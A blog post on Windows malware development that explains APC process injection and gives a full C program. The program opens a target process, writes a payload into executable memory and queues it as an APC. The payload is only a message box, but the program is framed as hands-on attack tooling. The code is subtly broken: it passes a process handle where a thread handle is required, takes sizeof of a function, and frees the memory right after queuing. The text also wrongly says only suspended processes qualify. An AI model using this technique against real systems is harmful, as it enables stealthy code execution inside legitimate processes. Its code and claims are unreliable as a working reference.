---
title: APC Injection
date: 2024-03-03
categories:
  - Malware Development
  - Process Injection
tags:
  - Maldev-Academy
toc: "true"
---
[Asynchronous Procedure Calls (APC)](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) are a fundamental mechanism in Windows operating systems, facilitating asynchronous execution of code within a process context. APCs are typically used for tasks like I/O completion, thread execution, and more. However, attackers exploit this mechanism to inject and execute malicious code within legitimate processes.

# How APC Injection Works

APC injection involves the insertion of malicious code into the address space of a target process by queuing a fake APC to be executed at a specific point in the process. This technique enables attackers to execute arbitrary code in the context of a legitimate process, thereby bypassing traditional security mechanisms.

The injection process typically follows these steps:

1. **Process Selection**: The attacker identifies a target process where they intend to inject malicious code.
2. **Memory Allocation**: They allocate memory within the target process to store the malicious payload.
3. **Payload Injection**: The attacker copies their malicious code into the allocated memory space of the target process.
4. **APC Queuing**: A fake APC is queued to the target process, pointing to the address of the malicious code.
5. **Execution**: When the target process enters an alertable state, the queued APC is executed, leading to the execution of the malicious payload.

## Alertable state

Asynchronous Procedure Calls (APCs) are kernel-mode routines executed within the context of a specific thread. Malware can exploit APCs to queue a payload, which then executes when scheduled.

Threads capable of running a queued APC function must be in an alertable state. This state is achieved when a thread is in a wait state, enabling it to process queued APC functions. To place a thread in an alertable state, WinAPI functions such as SleepEx, MsgWaitForMultipleObjectsEx, WaitForSingleObjectEx, WaitForMultipleObjectsEx, or SignalObjectAndWait can be used. These functions are typically utilized for thread synchronization and application responsiveness enhancement. However, in this context, merely passing a handle to a dummy event suffices.

# Hands-On: APC Injection with C Code Snippet

## Understanding the APC Injection Process

Before delving into the code snippet, let's understand the purpose of each function used in the APC injection process and its significance within the attack:

1. **[OpenProcess()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)**: This function is used to open a handle to the target process identified by its process ID (`<TARGET_PROCESS_ID>`). By opening the target process, we gain the necessary access rights to perform operations such as memory allocation and writing.
    
2. **[VirtualAllocEx()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)**: Once the target process is opened, this function is employed to allocate memory within the target process's address space. This allocated memory will be used to store the malicious payload, enabling its execution within the context of the target process.
    
3. **[WriteProcessMemory()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)**: With memory allocated within the target process, this function is utilized to write the malicious payload (in this case, the `MaliciousCode` function) into the allocated memory space. By writing the payload into the target process's memory, we prepare for its execution within the context of the process.
    
4. **[QueueUserAPC()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)**: This function is central to the APC injection technique. It queues an Asynchronous Procedure Call (APC) to the target process, specifying the address of the malicious payload to be executed. When the target process enters an alertable state, typically during certain system calls or when waiting for I/O operations, the queued APC is scheduled for execution

5. **Malicious Payload Execution**: Upon entering an alertable state, the queued APC is executed within the target process. As a result, the address of the malicious payload is invoked, leading to the execution of the malicious code within the context of the legitimate process.

## C Code Snippet

Now, let's dive into the provided C code snippet, which demonstrates the APC injection process. Remind that not all processes are eligible for this injection, only the suspended ones.

```c
#include <windows.h>
#include <stdio.h>

// Function pointer for the malicious payload
typedef VOID (*MALICIOUS_PAYLOAD)();

// Malicious payload to be executed
VOID MaliciousCode()
{
    MessageBoxA(NULL, "Malicious payload executed!", "APC Injection", MB_OK | MB_ICONWARNING);
}

int main()
{
    // Open the target process for injection
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <TARGET_PROCESS_ID>); // Replace <TARGET_PROCESS_ID> with the process ID of the target process

    if (hProcess == NULL)
    {
        printf("Failed to open target process. Error code: %d\n", GetLastError());
        return 1;
    }

    // Allocate memory within the target process for the malicious payload
    LPVOID pPayloadAddress = VirtualAllocEx(hProcess, NULL, sizeof(MaliciousCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (pPayloadAddress == NULL)
    {
        printf("Failed to allocate memory in target process. Error code: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // Write the malicious payload to the allocated memory in the target process
    if (!WriteProcessMemory(hProcess, pPayloadAddress, &MaliciousCode, sizeof(MaliciousCode), NULL))
    {
        printf("Failed to write malicious payload to target process. Error code: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pPayloadAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Queue the APC to the target process
    if (!QueueUserAPC((PAPCFUNC)pPayloadAddress, hProcess, NULL))
    {
        printf("Failed to queue APC to target process. Error code: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pPayloadAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("APC injected successfully!\n");

    // Clean up
    VirtualFreeEx(hProcess, pPayloadAddress, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}
```

This code snippet encapsulates the entire process of APC injection, from opening the target process to executing the malicious payload within its context. 

There are other types of techniques to implement APC injection, such as Early Bird APC Injection, which queues an APC to the main thread of a newly created process (spawned in an alertable state). 

Take in mind that this is not the only possible implementation, APC injection can be implemented using Standard Win32 APIs (Win32API), Native APIS (NTAPI) and Direct Syscalls (Syscall). To do not mess things up, we will be addressed this injection flavors in future blog posts. 

# Conclusion

In this post, we've explored the Asynchronous Procedure Calls (APC) injection. APC injection involves inserting malicious code into the address space of legitimate processes, leveraging the Windows operating system's mechanism for asynchronous code execution. 

Through a hands-on demonstration with a C code snippet, we've showcased the practical implementation of APC injection.